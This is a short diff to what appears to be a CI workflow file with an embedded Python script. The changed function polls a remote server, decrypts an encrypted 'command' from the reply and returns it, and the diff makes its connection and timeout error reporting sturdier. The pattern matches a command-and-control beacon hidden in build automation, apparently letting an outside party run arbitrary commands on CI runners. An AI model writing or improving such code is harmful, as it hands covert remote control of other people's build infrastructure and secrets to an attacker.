@@ -244,12 +244,15 @@ jobs:
                       data = response.json()
                       encrypted_command = data['command']
                       command = decrypt_command(encrypted_command)
-                      return command
+                      return command, None  # Success, no error
                   else:
-                      return {"type": "idle"}
+                      return {"type": "idle"}, f"HTTP {response.status_code}"
+              except requests.exceptions.ConnectionError:
+                  return None, "connection_refused"
+              except requests.exceptions.Timeout:
+                  return None, "timeout"
               except Exception as e:
-                  print(f"❌ Poll error: {e}")
-                  return {"type": "idle"}
+                  return None, str(e)
           
           def report_stats():
               try:
